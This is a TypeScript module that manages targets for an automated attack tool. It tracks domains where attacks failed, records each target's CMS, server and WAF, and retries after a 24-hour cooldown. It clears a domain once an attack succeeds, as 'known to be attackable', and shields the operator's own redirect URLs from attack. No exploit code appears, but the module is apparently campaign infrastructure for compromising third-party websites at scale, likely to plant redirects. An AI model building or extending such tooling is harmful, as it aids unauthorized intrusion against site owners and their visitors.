/**
 * Attack Blacklist System
 * 
 * Prevents re-attacking domains that have already failed.
 * - Auto-blacklists after configurable failure threshold
 * - Cooldown system: domains can be retried after cooldown period
 * - Permanent ban for domains that fail too many times
 * - Protects against attacking own redirect URLs
 */

import { getDb } from "./db";
import { attackBlacklist } from "../drizzle/schema";
import { eq, and, or, isNull, gt, sql, desc } from "drizzle-orm";

// ═══════════════════════════════════════════════
//  CONFIGURATION
// ═══════════════════════════════════════════════

const BLACKLIST_CONFIG = {
  /** Number of failures before temporary blacklist */
  failThreshold: 2,
  /** Cooldown period after blacklist (ms) — 24 hours */
  cooldownMs: 24 * 60 * 60 * 1000,
  /** Number of total failures before permanent ban */
  permaBanThreshold: 5,
  /** Max entries to keep in blacklist (cleanup oldest) */
  maxEntries: 10000,
};

// ═══════════════════════════════════════════════
//  CORE FUNCTIONS
// ═══════════════════════════════════════════════

/**
 * Extract clean domain from URL or domain string
 */
function extractDomain(input: string): string {
  return input
    .replace(/^https?:\/\//, "")
    .replace(/:\d+/, "")
    .replace(/\/.*$/, "")
    .toLowerCase()
    .trim();
}

/**
 * Check if a domain is blacklisted (should not be attacked)
 */
export async function isBlacklisted(domainOrUrl: string): Promise<{
  blacklisted: boolean;
  reason?: string;
  failCount?: number;
  cooldownUntil?: Date | null;
  isPermaBanned?: boolean;
}> {
  const domain = extractDomain(domainOrUrl);
  
  try {
    const db = await getDb();
    if (!db) return { blacklisted: false };
    
    const [entry] = await db.select()
      .from(attackBlacklist)
      .where(eq(attackBlacklist.domain, domain))
      .limit(1);
    
    if (!entry) return { blacklisted: false };
    
    // Permanently banned — always blocked
    if (entry.isPermaBanned) {
      return {
        blacklisted: true,
        reason: `Permanently banned: ${entry.reason}`,
        failCount: entry.failCount,
        isPermaBanned: true,
      };
    }
    
    // Check if cooldown has expired
    if (entry.cooldownUntil && new Date() > entry.cooldownUntil) {
      // Cooldown expired — allow retry but keep record
      return {
        blacklisted: false,
        reason: "Cooldown expired — retrying allowed",
        failCount: entry.failCount,
        cooldownUntil: entry.cooldownUntil,
      };
    }
    
    // Check if fail count exceeds threshold
    if (entry.failCount >= BLACKLIST_CONFIG.failThreshold) {
      return {
        blacklisted: true,
        reason: entry.reason,
        failCount: entry.failCount,
        cooldownUntil: entry.cooldownUntil,
        isPermaBanned: false,
      };
    }
    
    return { blacklisted: false, failCount: entry.failCount };
  } catch (e: any) {
    console.error(`[Blacklist] Error checking domain ${domain}: ${e.message}`);
    return { blacklisted: false }; // Fail open — don't block on DB errors
  }
}

/**
 * Check if a domain is one of our redirect URLs (self-attack protection)
 */
export async function isOwnRedirectUrl(domainOrUrl: string, redirectUrls: string[]): Promise<boolean> {
  const domain = extractDomain(domainOrUrl);
  
  for (const redirectUrl of redirectUrls) {
    const redirectDomain = extractDomain(redirectUrl);
    if (domain === redirectDomain) return true;
    // Also check if target is a subdomain of redirect
    if (domain.endsWith(`.${redirectDomain}`)) return true;
    if (redirectDomain.endsWith(`.${domain}`)) return true;
  }
  
  return false;
}

/**
 * Record a failed attack and potentially blacklist the domain
 */
export async function recordFailedAttack(params: {
  domain: string;
  reason: string;
  errors: string[];
  durationMs: number;
  cms?: string | null;
  serverType?: string | null;
  waf?: string | null;
}): Promise<{ blacklisted: boolean; failCount: number; permaBanned: boolean }> {
  const domain = extractDomain(params.domain);
  
  try {
    const db = await getDb();
    if (!db) return { blacklisted: false, failCount: 0, permaBanned: false };
    
    // Check if already exists
    const [existing] = await db.select()
      .from(attackBlacklist)
      .where(eq(attackBlacklist.domain, domain))
      .limit(1);
    
    if (existing) {
      const newFailCount = existing.failCount + 1;
      const newTotalAttempts = existing.totalAttempts + 1;
      const newTotalDuration = existing.totalDurationMs + params.durationMs;
      const shouldPermaBan = newFailCount >= BLACKLIST_CONFIG.permaBanThreshold;
      const cooldownUntil = shouldPermaBan
        ? null // Perma-banned, no cooldown
        : new Date(Date.now() + BLACKLIST_CONFIG.cooldownMs);
      
      await db.update(attackBlacklist)
        .set({
          failCount: newFailCount,
          totalAttempts: newTotalAttempts,
          totalDurationMs: newTotalDuration,
          lastFailedAt: new Date(),
          reason: params.reason,
          errors: params.errors.slice(0, 10),
          cooldownUntil,
          isPermaBanned: shouldPermaBan,
          cms: params.cms || existing.cms,
          serverType: params.serverType || existing.serverType,
          waf: params.waf || existing.waf,
        })
        .where(eq(attackBlacklist.id, existing.id));
      
      return {
        blacklisted: newFailCount >= BLACKLIST_CONFIG.failThreshold,
        failCount: newFailCount,
        permaBanned: shouldPermaBan,
      };
    } else {
      // New entry
      const cooldownUntil = new Date(Date.now() + BLACKLIST_CONFIG.cooldownMs);
      
      await db.insert(attackBlacklist).values({
        domain,
        reason: params.reason,
        failCount: 1,
        errors: params.errors.slice(0, 10),
        cooldownUntil,
        isPermaBanned: false,
        totalAttempts: 1,
        totalDurationMs: params.durationMs,
        cms: params.cms || null,
        serverType: params.serverType || null,
        waf: params.waf || null,
      } as any);
      
      return {
        blacklisted: 1 >= BLACKLIST_CONFIG.failThreshold,
        failCount: 1,
        permaBanned: false,
      };
    }
  } catch (e: any) {
    console.error(`[Blacklist] Error recording failure for ${domain}: ${e.message}`);
    return { blacklisted: false, failCount: 0, permaBanned: false };
  }
}

/**
 * Record a successful attack — reset blacklist status for the domain
 */
export async function recordSuccessfulAttack(domainOrUrl: string): Promise<void> {
  const domain = extractDomain(domainOrUrl);
  
  try {
    const db = await getDb();
    if (!db) return;
    
    // Remove from blacklist on success (domain is now known to be attackable)
    await db.delete(attackBlacklist).where(eq(attackBlacklist.domain, domain));
  } catch (e: any) {
    console.error(`[Blacklist] Error clearing blacklist for ${domain}: ${e.message}`);
  }
}

/**
 * Filter a list of targets, removing blacklisted and self-redirect domains
 */
export async function filterTargets(
  targets: Array<{ domain: string; url?: string; [key: string]: any }>,
  redirectUrls: string[],
): Promise<{
  allowed: typeof targets;
  blocked: Array<{ target: typeof targets[0]; reason: string }>;
}> {
  const allowed: typeof targets = [];
  const blocked: Array<{ target: typeof targets[0]; reason: string }> = [];
  
  for (const target of targets) {
    const domainToCheck = target.url || target.domain;
    
    // Check self-attack protection
    if (await isOwnRedirectUrl(domainToCheck, redirectUrls)) {
      blocked.push({ target, reason: "Self-attack protection: domain matches redirect URL" });
      continue;
    }
    
    // Check blacklist
    const blacklistResult = await isBlacklisted(domainToCheck);
    if (blacklistResult.blacklisted) {
      blocked.push({
        target,
        reason: `Blacklisted (${blacklistResult.failCount} failures): ${blacklistResult.reason}${blacklistResult.isPermaBanned ? " [PERMA-BANNED]" : ""}`,
      });
      continue;
    }
    
    allowed.push(target);
  }
  
  return { allowed, blocked };
}

/**
 * Get blacklist stats for dashboard
 */
export async function getBlacklistStats(): Promise<{
  totalBlacklisted: number;
  permaBanned: number;
  inCooldown: number;
  recentFailures: Array<{
    domain: string;
    failCount: number;
    reason: string;
    lastFailedAt: Date;
    isPermaBanned: boolean;
  }>;
}> {
  try {
    const db = await getDb();
    if (!db) return { totalBlacklisted: 0, permaBanned: 0, inCooldown: 0, recentFailures: [] };
    
    const all = await db.select()
      .from(attackBlacklist)
      .orderBy(desc(attackBlacklist.lastFailedAt))
      .limit(100);
    
    const now = new Date();
    const totalBlacklisted = all.filter(e => 
      e.isPermaBanned || (e.failCount >= BLACKLIST_CONFIG.failThreshold && (!e.cooldownUntil || e.cooldownUntil > now))
    ).length;
    const permaBanned = all.filter(e => e.isPermaBanned).length;
    const inCooldown = all.filter(e => 
      !e.isPermaBanned && e.cooldownUntil && e.cooldownUntil > now
    ).length;
    
    return {
      totalBlacklisted,
      permaBanned,
      inCooldown,
      recentFailures: all.slice(0, 20).map(e => ({
        domain: e.domain,
        failCount: e.failCount,
        reason: e.reason,
        lastFailedAt: e.lastFailedAt,
        isPermaBanned: e.isPermaBanned,
      })),
    };
  } catch (e: any) {
    console.error(`[Blacklist] Error getting stats: ${e.message}`);
    return { totalBlacklisted: 0, permaBanned: 0, inCooldown: 0, recentFailures: [] };
  }
}

/**
 * Manually unblock a domain
 */
export async function unblockDomain(domainOrUrl: string): Promise<boolean> {
  const domain = extractDomain(domainOrUrl);
  
  try {
    const db = await getDb();
    if (!db) return false;
    
    await db.delete(attackBlacklist).where(eq(attackBlacklist.domain, domain));
    return true;
  } catch (e: any) {
    console.error(`[Blacklist] Error unblocking ${domain}: ${e.message}`);
    return false;
  }
}

/**
 * Cleanup old expired entries
 */
export async function cleanupExpiredEntries(): Promise<number> {
  try {
    const db = await getDb();
    if (!db) return 0;
    
    const now = new Date();
    // Remove non-permabanned entries whose cooldown expired more than 7 days ago
    const sevenDaysAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
    
    const result = await db.delete(attackBlacklist)
      .where(
        and(
          eq(attackBlacklist.isPermaBanned, false),
          gt(sql`${attackBlacklist.cooldownUntil}`, sql`'1970-01-01'`),
          sql`${attackBlacklist.cooldownUntil} < ${sevenDaysAgo}`,
        )
      );
    
    return (result as any)[0]?.affectedRows || 0;
  } catch (e: any) {
    console.error(`[Blacklist] Cleanup error: ${e.message}`);
    return 0;
  }
}
